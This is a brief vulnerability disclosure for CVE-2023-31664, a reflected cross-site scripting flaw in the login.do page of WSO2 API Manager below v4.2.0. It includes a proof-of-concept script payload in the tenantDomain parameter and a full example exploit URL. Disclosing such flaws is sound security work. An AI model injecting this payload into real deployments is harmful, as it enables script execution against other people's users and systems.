# CVE-2023-31664
CVE-2023-31664 
A reflected cross-site scripting (XSS) vulnerability in /authenticationendpoint/login.do of WSO2 Api Manager below v4.2.0 allows attackers to execute arbitrary web scripts or HTML via a crafted payload injected into the tenantDomain parameter.

PoC: to exploit it only needs change the value of tenantDomain parameter from super.carbon to </script><script>alert(document.domain)</script>

Example: 
https://host/authenticationendpoint/login.do?client_id=..TRUNCATED...+openid&state=%2F&tenantDomain=</script><script>alert(document.domain)</script>&sessionDataKey=00000000000&relyingParty=AaAaAaAaA&type=oidc&sp=apim_admin_portal&isSaaSApp=true&authenticators=BasicAuthenticator 

Reported by: na1man


